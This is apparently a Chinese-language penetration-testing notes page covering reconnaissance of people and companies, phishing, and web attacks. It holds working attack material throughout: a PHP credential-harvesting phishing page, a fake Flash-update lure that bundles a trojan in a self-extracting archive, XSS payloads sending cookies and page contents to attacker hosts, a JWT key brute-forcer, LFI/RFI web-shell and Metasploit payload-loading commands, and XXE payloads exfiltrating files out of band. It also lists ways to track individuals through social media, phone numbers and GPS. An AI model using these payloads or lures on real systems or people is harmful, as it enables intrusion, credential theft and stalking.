fa-external-link-alt"></i></a><br>领英用户提取<br><a class="link" href="https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme">https://cse.google.com/cse?cx=001394533911082033616:tm5y1wqwmme<i class="fas fa-external-link-alt"></i></a><h2 id="Shodan-fofa-zoomeye"><a href="#Shodan-fofa-zoomeye" class="headerlink" title="Shodan/fofa/zoomeye"></a>Shodan/fofa/zoomeye</h2><h2 id="Google-dorks"><a href="#Google-dorks" class="headerlink" title="Google dorks"></a>Google dorks</h2>Site,filetype,intitle,inurl,intext等<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2>电话、邮箱，姓名<br>目录遍历<br>备份文件<br>(<a class="link" href="http://www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip/">www.zip,xx.com.zip,www.xx.com.zip,wwwroot.zip<i class="fas fa-external-link-alt"></i></a>)<br>.svn/.git/sql/robots/crossdomin.xml/DS_Store等<br><a class="link" href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit<i class="fas fa-external-link-alt"></i></a><br>若是论坛ID=1的用户名一般为管理、或查看帖子信息、生成字典<br>网页上客服的QQ(先判断是企业的还是个人，用处有时不太大，看怎么用，搞个鱼叉什么的)<h2 id="网页缓存"><a href="#网页缓存" class="headerlink" title="网页缓存"></a>网页缓存</h2><a class="link" href="http://www.cachedpages.com/">http://www.cachedpages.com/<i class="fas fa-external-link-alt"></i></a><h2 id="图片反查"><a href="#图片反查" class="headerlink" title="图片反查"></a>图片反查</h2>百度识图、googleimage、tineye<br>原图查询坐标<h2 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h2>QQ、weibo、支付宝、脉脉、领英、咸鱼、短视频、人人、贴吧、论坛<br>外网信息<br>有些人喜欢把自己的生活传到外网<br>推特、ins、fb等<h2 id="手机号加入通讯录匹配各个APP用户信息"><a href="#手机号加入通讯录匹配各个APP用户信息" class="headerlink" title="手机号加入通讯录匹配各个APP用户信息"></a>手机号加入通讯录匹配各个APP用户信息</h2><h2 id="注册过的网站"><a href="#注册过的网站" class="headerlink" title="注册过的网站"></a>注册过的网站</h2><a class="link" href="https://www.reg007.com/">https://www.reg007.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.usersearch.org/">https://www.usersearch.org/<i class="fas fa-external-link-alt"></i></a><h2 id="目标人员的兴趣"><a href="#目标人员的兴趣" class="headerlink" title="目标人员的兴趣"></a>目标人员的兴趣</h2>  目标人员的兴趣 注册过的小众论坛，站点<br>针对此类站点的深入<br>收集到的用户名，电话等信息生成字典<h2 id="邮箱搜集"><a href="#邮箱搜集" class="headerlink" title="邮箱搜集"></a>邮箱搜集</h2><a class="link" href="https://hunter.io/">https://hunter.io/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/killswitch-GUI/SimplyEmail">https://github.com/killswitch-GUI/SimplyEmail<i class="fas fa-external-link-alt"></i></a><h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><a class="link" href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper<i class="fas fa-external-link-alt"></i></a><h2 id="验证邮箱是否存在"><a href="#验证邮箱是否存在" class="headerlink" title="验证邮箱是否存在"></a>验证邮箱是否存在</h2><a class="link" href="https://tools.verifyemailaddress.io/">https://tools.verifyemailaddress.io/<i class="fas fa-external-link-alt"></i></a><h2 id="历史泄露过的资料等"><a href="#历史泄露过的资料等" class="headerlink" title="历史泄露过的资料等"></a>历史泄露过的资料等</h2>库<br><a class="link" href="https://haveibeenpwned.com/">https://haveibeenpwned.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/kernelmachine/haveibeenpwned">https://github.com/kernelmachine/haveibeenpwned<i class="fas fa-external-link-alt"></i></a><h2 id="Github-Gitee等代码托管平台"><a href="#Github-Gitee等代码托管平台" class="headerlink" title="Github/Gitee等代码托管平台"></a>Github/Gitee等代码托管平台</h2><a class="link" href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/MiSecurity/x-patrol">https://github.com/MiSecurity/x-patrol<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/az0ne/Github_Nuggests">https://github.com/az0ne/Github_Nuggests<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/mazen160/GithubCloner%E5%85%8B%E9%9A%86%E7%94%A8%E6%88%B7%E7%9A%84github">https://github.com/mazen160/GithubCloner克隆用户的github<i class="fas fa-external-link-alt"></i></a><h2 id="被入侵网址列表"><a href="#被入侵网址列表" class="headerlink" title="被入侵网址列表"></a>被入侵网址列表</h2><a class="link" href="http://zone-h.org/archive">http://zone-h.org/archive<i class="fas fa-external-link-alt"></i></a><br>wooyun镜像查找目标企业曾出现的漏洞<h2 id="GPS查询"><a href="#GPS查询" class="headerlink" title="GPS查询"></a>GPS查询</h2><a class="link" href="https://www.opengps.cn/Default.aspx">https://www.opengps.cn/Default.aspx<i class="fas fa-external-link-alt"></i></a><h2 id="网站URL提取"><a href="#网站URL提取" class="headerlink" title="网站URL提取"></a>网站URL提取</h2><a class="link" href="http://www.bulkdachecker.com/url-extractor/">http://www.bulkdachecker.com/url-extractor/<i class="fas fa-external-link-alt"></i></a><h2 id="蜜罐判断-参考一下即可"><a href="#蜜罐判断-参考一下即可" class="headerlink" title="蜜罐判断(参考一下即可)"></a>蜜罐判断(参考一下即可)</h2><a class="link" href="https://honeyscore.shodan.io/">https://honeyscore.shodan.io/<i class="fas fa-external-link-alt"></i></a><h2 id="默认密码"><a href="#默认密码" class="headerlink" title="默认密码"></a>默认密码</h2><a class="link" href="https://default-password.info/">https://default-password.info/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://routerpasswords.com/">http://routerpasswords.com<i class="fas fa-external-link-alt"></i></a><h2 id="如需注册"><a href="#如需注册" class="headerlink" title="如需注册"></a>如需注册</h2>Sms<br><a class="link" href="https://www.materialtools.com/">https://www.materialtools.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://receivefreesms.com/">http://receivefreesms.com/<i class="fas fa-external-link-alt"></i></a><br>Email<br><a class="link" href="https://10minutemail.net/">https://10minutemail.net/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://zh.mytrashmailer.com/">https://zh.mytrashmailer.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://24mail.chacuo.net/enus">http://24mail.chacuo.net/enus<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.linshiyouxiang.net/">https://www.linshiyouxiang.net/<i class="fas fa-external-link-alt"></i></a><br>Fake id<br><a class="link" href="https://www.fakenamegenerator.com/">https://www.fakenamegenerator.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://www.haoweichi.com/">http://www.haoweichi.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://www.fakeaddressgenerator.com/">https://www.fakeaddressgenerator.com/<i class="fas fa-external-link-alt"></i></a><h2 id="企业信息"><a href="#企业信息" class="headerlink" title="企业信息"></a>企业信息</h2>天眼查、企查查、企业信用信息公示系统<br>企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计<h1 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h1><h2 id="win10-安装kali-wsl"><a href="#win10-安装kali-wsl" class="headerlink" title="win10 安装kali(wsl)"></a>win10 安装kali(wsl)</h2>Microsoft Store查找kali下载。<br>Powershell执行<blockquote>
<p>Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux<br>源设置vim /etc/apt/source.list<br>deb <a class="link" href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali<i class="fas fa-external-link-alt"></i></a> kali-rolling main contrib non-free<br>deb-src <a class="link" href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali<i class="fas fa-external-link-alt"></i></a> kali-rolling main contrib non-free<br>deb <a class="link" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali<i class="fas fa-external-link-alt"></i></a> kali-rolling main contrib non-free<br>deb-src <a class="link" href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali<i class="fas fa-external-link-alt"></i></a> kali-rolling main contrib non-free<br>sudo su<br>passwd root修改root密码<br>apt-get update &amp;apt-get upgrade 更新<br>apt-get dist-upgrade<br>apt-get clean<br>cmd&gt;kali config –default-user root 设置默认启动用户为root<br>cmd&gt;net stop/start LxssManager重启服务<br>apt-get install metasploit-framework<br>apt install kali-linux-full 安装完整kali工具集</p>
</blockquote>
<h2 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h2><h3 id="XSS克隆钓鱼"><a href="#XSS克隆钓鱼" class="headerlink" title="XSS克隆钓鱼"></a>XSS克隆钓鱼</h3>保存js&amp;css到服务器，登录action改为接受密码的文件action=”./pass.php”<?php //php
$user=$_POST['username'];
$pass=$_POST['password'];
$file=fopen('pass.txt','a+');
fwrite($file,$user."|"."pass" . "\n");
fclose($file);
echo "<script>window.location.href=\"http://192.168.0.1\"\n";
?>
构造payload<script>window.location.href="http://192.168.0.1/login.html"</script>
php –S 0.0.0.0:8080 –t ./<h3 id="伪造页面钓鱼"><a href="#伪造页面钓鱼" class="headerlink" title="伪造页面钓鱼"></a>伪造页面钓鱼</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><a class="link" href="https://github.com/r00tSe7en/Fake-flash.cn">https://github.com/r00tSe7en/Fake-flash.cn<i class="fas fa-external-link-alt"></i></a><br>添加xss平台模块<br>window.alert = function(name){<br>var iframe = document.createElement(“IFRAME”);<br>iframe.style.display=”none”;<br>iframe.setAttribute(“src”,’data:text/plain’);<br>document.documentElement.appendChild(iframe);<br>window.frames[0].window.alert(name);<br>iframe.parentNode.removeChild(iframe);<br>}<br>alert(“您的FLASH版本过低，尝试升级后访问该页面！”);<br>window.location.href=”<a class="link" href="http://www.flash.com&quot;/">http://www.flash.com&quot;<i class="fas fa-external-link-alt"></i></a>;<br>制作自解压捆绑<br>一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级-&gt;自解压选项，设置解压路径，c:\windows\temp\，设置-&gt;解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。<br>ResourceHacker修改文件图标<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4>if(empty($_COOKIE[‘flash’])){<pre><code>echo &#39;&lt;script&gt;alert(&quot;你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！&quot;);window.location=&quot;http://www.flash.cn.xx.com/&quot;&lt;/script&gt;&#39;;
setcookie(&quot;flash&quot;,&quot;true&quot;,time()+30*2400);
</code></pre>
}<h2 id="对外服务攻击"><a href="#对外服务攻击" class="headerlink" title="对外服务攻击"></a>对外服务攻击</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="前端-逻辑漏洞"><a href="#前端-逻辑漏洞" class="headerlink" title="前端/逻辑漏洞"></a>前端/逻辑漏洞</h4><h5 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h5>任意用户注册<br>可爆破用户名<br>注入<br>XSS<h5 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h5>爆破用户名，密码<br>注入<br>万能密码<br>Xss<br>Xss+Csrf<br>修改返回包信息，登入他人账户<br>修改cookie中的参数，如user,adminid等<h5 id="任意密码重置"><a href="#任意密码重置" class="headerlink" title="任意密码重置"></a>任意密码重置</h5>1．重置一个账户，不发送验证码，设置验证码为空发送请求。<br>2．发送验证码，查看相应包<br>3．验证码生存期的爆破<br>4．修改相应包为成功的相应包<br>5．手工直接跳转到校验成功的界面<br>6．两个账户，重置别人密码时，替换验证码为自己正确的验证码<br>7．重置别人密码时，替换为自己的手机号<br>8．重置自己的成功时，同意浏览器重置别人的，不发验证码<br>9．替换用户名，ID，cookie，token参数等验证身份的参数<br>10．通过越权修改他人的找回信息如手机/邮箱来重置<h5 id="信息泄露-1"><a href="#信息泄露-1" class="headerlink" title="信息泄露"></a>信息泄露</h5>HTML源码、JS等查看信息搜集一章<h5 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h5>登录参数修改为注册参数/reg、/register、/sign等<h4 id="JWT攻击手法"><a href="#JWT攻击手法" class="headerlink" title="JWT攻击手法"></a>JWT攻击手法</h4><a class="link" href="https://jwt.io/#debugger-io">https://jwt.io/#debugger-io<i class="fas fa-external-link-alt"></i></a><h5 id="未校验签名"><a href="#未校验签名" class="headerlink" title="未校验签名"></a>未校验签名</h5>将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求<h5 id="禁用哈希"><a href="#禁用哈希" class="headerlink" title="禁用哈希"></a>禁用哈希</h5><img src="1.png" alt="image"><br></li>
</ul>
<p>  Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块<br><img src="2.png" alt="image"><br></p>
<p>  jwt.encode({‘user’:’admin’,’arg1’:’value1’,’arg2’:’value2’},algorithm=’none’,key=’’)</p>
<h5 id="暴破弱密钥"><a href="#暴破弱密钥" class="headerlink" title="暴破弱密钥"></a>暴破弱密钥</h5><blockquote>
<p>pip3 install pyjwt<br>python3 crack.py<br>  import jwt<br>  import termcolor</p>
</blockquote>
<p>  jwt_str = R’token’<br>  with open(‘/root/password.txt’) as f:</p>
<pre><code>for line in f:
key_ = line.strip()
try:
  jwt.decode(jwt_str,verify=True,key=key_)
  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
  break
except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
  print(&#39;\r&#39;,&#39;\bfound key --&gt;&#39;,termcolor.colored(key_,&#39;green&#39;),&#39;&lt;--&#39;)
except jwt.exceptions.InvalidSignatureError:
  print(&#39;\r&#39;,&#39; &#39; * 64, &#39;\r\btry&#39;,key_,end=&#39;&#39;,flush=True)
  continue
</code></pre>
<p>  else:</p>
<pre><code>print(&#39;\r&#39;,&#39;\bnot found.&#39;)
</code></pre>
<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>  打COOKIE<br>  &lt;svg/onload=”javascript:document.location.href=(‘<a class="link" href="http://xx.xx.xx.xx:7777/?cookie=&#39;+document.cookie)&quot;&gt;">http://xx.xx.xx.xx:7777?cookie=&#39;+document.cookie)&quot;&gt;<i class="fas fa-external-link-alt"></i></a><br>  读取HTML<br>  &lt;svg/onload=”document.location=’<a class="link" href="http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;">http://xx.xx.xx.xx:7777/?&#39;+btoa(document.body.innerHTML)&quot;&gt;<i class="fas fa-external-link-alt"></i></a><br>  读文件<br>  &lt;svg/onload=”<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {</p>
<pre><code>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
  &#123;
      document.location=&#39;http://xx.xx.xx.xx:7777/?&#39;+btoa(xmlhttp.responseText);
  &#125;
</code></pre>
<p>  }<br>  xmlhttp.open(“GET”,”file.php”,true);<br>  xmlhttp.send();<br>  “&gt;<br>  XSS+SSRF读取服务器文件</p>
<p>  &lt;svg/onload=”<br>  xmlhttp=new XMLHttpRequest();<br>  xmlhttp.onreadystatechange=function()<br>  {<br>  if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)<br>  {</p>
<pre><code>  document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);
</code></pre>
<p>  }<br>  }<br>  xmlhttp.open(“POST”,”request.php”,true);<br>  xmlhttp.setRequestHeader(“Content-type”,”application/x-www-form-urlencoded”);<br>  xmlhttp.send(“url=file:///etc/passwd”);<br>  “&gt;</p>
<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><p>  查看有无token等验证身份的参数，删掉后是否返回正常<br>  查看header中referer,origin参数，删掉后是否返回正常<br>  使用csrftester/burpsuite生成表单，以另一账号和浏览器打开测试<br>  去掉referer中域名后面的文件夹或文件<br>  替换二级域名</p>
<h4 id="php任意文件读取-下载"><a href="#php任意文件读取-下载" class="headerlink" title="php任意文件读取/下载"></a>php任意文件读取/下载</h4><p>  readfile()、file_get_contents()、fopen()等读文件的函数不严谨，读取文件路径可控，输出内容。<br>  下载配置文件<br>  Redis、Weblogic、ftp、mysql、web配置文件、history文件、数据库配置文件<br>  下载log文件<br>  下载web文件<br>  /1.php?f=../../etc/passwd<br>  /1.php?f=file:///etc/passwd(file://绕过../的防护)<br>  /1.php?f=file:///etc/passwd</p>
<h4 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h4><p>  函数:<br>  include<br>  require<br>  include_once<br>  require_once</p>
<h5 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h5><p>  file:// — 访问本地文件系统<br>  file协议的工作目录是当前目录，使用file:///wwwroot/1.php等同于./wwwroot/1.php可用于绕过一些情况<br>  php:// — 访问各个输入/输出流（I/O streams）<br><img src="3.png" alt="image"></p>
<p>  读取<br>  /1.php?file=php://filter/read=convert.base64-encode/resource=./1.php<br>  写入<br>  /1.php?file=php://filter/write=convert.base64-decode/resource=[file]”,”base64</p>
<h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>  <a class="link" href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite<i class="fas fa-external-link-alt"></i></a></p>
<h6 id="allow-url-include-开启时Getshell"><a href="#allow-url-include-开启时Getshell" class="headerlink" title="allow_url_include 开启时Getshell"></a>allow_url_include 开启时Getshell</h6><p>  远程文件包含<br>  /1.php?file=<a class="link" href="http://remote.com/shell.txt">http://remote.com/shell.txt<i class="fas fa-external-link-alt"></i></a><br>  /1.php?file=php://input  POST:<?php phpinfo();?><br>  或使用curl</p>
<blockquote>
<p>curl -v “<a class="link" href="http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;">http://127.0.0.1:8888/ctf/cli/3.php?file=php://input&quot;<i class="fas fa-external-link-alt"></i></a> -d “<?php phpinfo();?>“<br>  或使用data://协议解析base64的代码<br>  /1.php?file=data://text/plain;base64,PD9waHAgIHBocGluZm8oKTs/Pg==</p>
</blockquote>
<h6 id="allow-url-include-关闭时Getshell"><a href="#allow-url-include-关闭时Getshell" class="headerlink" title="allow_url_include 关闭时Getshell"></a>allow_url_include 关闭时Getshell</h6><p>  攻击机开启共享<br>  /1.php?file=//attacker/1.php<br>  创建webdav服务，shell文件放入目录包含即可</p>
<blockquote>
<p>docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 –rm –name webdav bytemark/webdav<br>  Shell文件放入/root/webdav/data<br>  /1.php?file=//attacker/1.php</p>
</blockquote>
<h6 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h6><p>  Fuzz文件<br>  <a class="link" href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb<i class="fas fa-external-link-alt"></i></a><br>  <a class="link" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists<i class="fas fa-external-link-alt"></i></a><br>  <a class="link" href="https://blog.csdn.net/qq_33020901/article/details/78810035">https://blog.csdn.net/qq_33020901/article/details/78810035<i class="fas fa-external-link-alt"></i></a><br>  /1.php?file=<?php phpinfo();?><br>  /1.php?file=../../../../../../../var/log/apache2/access.log<br>  Win下使用phpstudy<br>  请求/<?php phpinfo();?><br>  包含错误日志<br>  /1.php?file=C:\phpStudy\Apache\logs\error.log</p>
<h6 id="上传个图片格式的木马直接包含"><a href="#上传个图片格式的木马直接包含" class="headerlink" title="上传个图片格式的木马直接包含"></a>上传个图片格式的木马直接包含</h6><p>  /1.php?file=/uploadfile/1.jpg</p>
<h6 id="限制后缀时"><a href="#限制后缀时" class="headerlink" title="限制后缀时"></a>限制后缀时</h6>  <?php
  $file = $_GET['file'].".php";
  include($file);
  ?><br>
  利用伪协议zip，构造一个zip压缩包，打包一个shell.php，将压缩包更名为png
![image](Pentest_Note/4.png)

<p>  请求/1.php?file=zip://shell.png%23shell<br><img src="5.png" alt="image"></p>
<p>  也可使用phar协议访问<br>  /1.php?file=phar://shell.png/shell<br>  老版本可以使用%00截断<br>  /etc/passwd%00<br>  (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)<br>  /var/www/%00<br>  /etc/passwd/././././././.[…]/./././././.<br>  (需要 magic_quotes_gpc=off<br>  (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)<br>  点号截断：<br>  /boot.ini/………[…]…………<br>  (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
<h6 id="phpinfo-LFI-本地文件包含临时文件getshell"><a href="#phpinfo-LFI-本地文件包含临时文件getshell" class="headerlink" title="phpinfo-LFI 本地文件包含临时文件getshell"></a>phpinfo-LFI 本地文件包含临时文件getshell</h6><p>  利用临时文件删除时间差获取shell<br>  需要一个lfi漏洞+phpinfo页面<br>  在/tmp/目录下生成个密码为f的一句话木马g<br><img src="6.png" alt="image"></p>
<p>  修改脚本的phpinfo文件名称<br><img src="7.png" alt="image"></p>
<p>  LFI文件<br><img src="8.png" alt="image"></p>
<p>  执行</p>
<blockquote>
<p>python getshell.py 192.168.0.108 80 100<br>  80是端口、100是线程<br><img src="9.png" alt="image"><br><img src="10.png" alt="image"></p>
</blockquote>
<p>  <a class="link" href="http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27">http://192.168.0.110/index.php?file=../../../tmp/g&amp;f=echo%20%271%27<i class="fas fa-external-link-alt"></i></a></p>
<h6 id="session-lfi-getshell"><a href="#session-lfi-getshell" class="headerlink" title="session + lfi getshell"></a>session + lfi getshell</h6><p>  session.upload_progress.enabled启用时，文件上传会产生进度文件<br>  /var/lib/php5/sess_<br>  /var/lib/php/sess_</p>
<h6 id="LFI-SSH-Log"><a href="#LFI-SSH-Log" class="headerlink" title="LFI SSH Log"></a>LFI SSH Log</h6><blockquote>
<p>ssh ‘<?php system($_GET['c']); ?>‘@192.168.0.107<br><a class="link" href="http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls">http://192.168.0.107/lfi.php?file=/var/log/auth.log&amp;c=ls<i class="fas fa-external-link-alt"></i></a></p>
</blockquote>
<h6 id="RFI-amp-命令注入上线MSF"><a href="#RFI-amp-命令注入上线MSF" class="headerlink" title="RFI&amp;命令注入上线MSF"></a>RFI&amp;命令注入上线MSF</h6><p>  MSF生成<br>  #use exploit/multi/script/web_delivery<br>  #set target PHP<br>  注入点注入：<br>  php -d allow_url_fopen=true -r “eval(file_get_contents(‘<a class="link" href="http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;">http://192.168.0.107:1234/OgsOFaj3yKH&#39;));&quot;<i class="fas fa-external-link-alt"></i></a><br>  RFI：<br>  <a class="link" href="http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH">http://www.xx.com/file=http://192.168.0.107:1234/OgsOFaj3yKH<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ul>
<h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre><code>XML设计的宗旨是传输数据，而非显示数据
XXE=XML外部实体注入、XML=可扩展标记语言
Xml文件声明
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
DTD为XML的文档类型定义
引入外部DTD
&lt;!DOCTYPE 根元素 SYSTEM &quot;filename&quot;&gt;
参数实体+外部实体
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %file;
]&gt;
</code></pre>
<h5 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h5><pre><code>闭合标签，改写xml文件，用户可控，有拼接代码
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manager&gt;
    &lt;admin id=&quot;1&quot;&gt;
&lt;username&gt;admin&lt;/username&gt;
&lt;password&gt;admin&lt;/password&gt;
&lt;/admin&gt;
&lt;admin id=&quot;2&quot;&gt;
&lt;username&gt;root&lt;/username&gt;
&lt;password&gt;root&lt;/password&gt;
&lt;/admin&gt;
&lt;/manager&gt;
若是password可控，拼接代码形成注入
admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;
</code></pre>
<h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><pre><code>https://github.com/AonCyberLabs/xxe-recursive-download
程序解析XML输入时，未禁止外部实体的加载，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害
</code></pre>
<h6 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h6><pre><code>回显路径
    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;test&quot;&gt;%remote;]&gt;
DNSLOG
    http://www.dnslog.cn/
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://xxx.dnslog.cn/xxe&quot;&gt;]&gt;
&lt;xxe&gt;&amp;dtd;&lt;/xxe&gt;
Webdav
    存在webdav可使用PROPPATCH、PROPFIND、 LOCK等请求方法接受xml输入形成xxe
Wsdl使用AWVS测试
</code></pre>
<h6 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h6><pre><code>如遇与xml交互的地方
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY test &quot;this is test&quot;&gt; 
]&gt; 
&lt;root&gt;&amp;test;&lt;/root&gt;
看是否输出
检查是否支持外部实体
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!DOCTYPE ANY [  
&lt;!ENTITY % foo SYSTEM &quot;http://attacker/evil.xml&quot;&gt; 
%foo;
]&gt; 
查看你的服务器是否有请求
JSON content-type XXE
修改Content-Type: application/xml
X-Requested-With: XMLHttpRequest
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;root&gt;
&lt;参数name&gt;name&lt;/参数name&gt;
&lt;参数value&gt;&amp;xxe;&lt;/ 参数value&gt;
&lt;/root&gt;
</code></pre>
<h6 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h6><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:////etc/passwd&quot;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
也可去掉文件列目录
file:///root/.sh/id_rsa
特殊字符
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:////tmp/xxx.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://attacker/evil.dtd&quot;&gt; 
%dtd; ]&gt; 
&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
evil.dtd
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre>
<h6 id="Blind-OOB-XXE无回显读取"><a href="#Blind-OOB-XXE无回显读取" class="headerlink" title="Blind OOB XXE无回显读取"></a>Blind OOB XXE无回显读取</h6><pre><code>需使用参数实体，引用外部DTD
Payload
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
test.dtd
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://attacker:9999?p=%file;&#39;&gt;&quot;&gt;
</code></pre>
